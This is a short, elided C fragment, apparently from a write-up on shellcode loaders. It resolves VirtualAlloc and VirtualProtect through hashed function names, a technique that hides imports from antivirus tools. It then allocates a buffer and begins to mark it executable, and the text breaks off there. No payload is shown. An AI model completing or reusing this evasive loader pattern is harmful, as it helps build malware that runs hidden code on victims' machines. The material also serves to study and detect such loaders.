...
DWORD HashOfFunctions[] = {99236, 49605, 397301};
...
int main()
{
	...
	for (int i = 0; i < sizeof(HashOfFunctions) / sizeof(HashOfFunctions[0]); i++)
	{
		...
		else if (i == 2) pVirtualProtect = (VirtualProtect_t)func;
	}

	if (!pVirtualAlloc || !pVirtualFree || !pVirtualProtect)
	{
		printf("[-] Error: Not all functions were resolved!\n");
		return 1;
	}

	LPVOID exec = pVirtualAlloc(NULL, buflen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!exec)
	{
		return 1;
	}
	...
	if (!pVirtualProtect(exec, buflen, PAGE_EXECUTE, &oldProtect))
	{
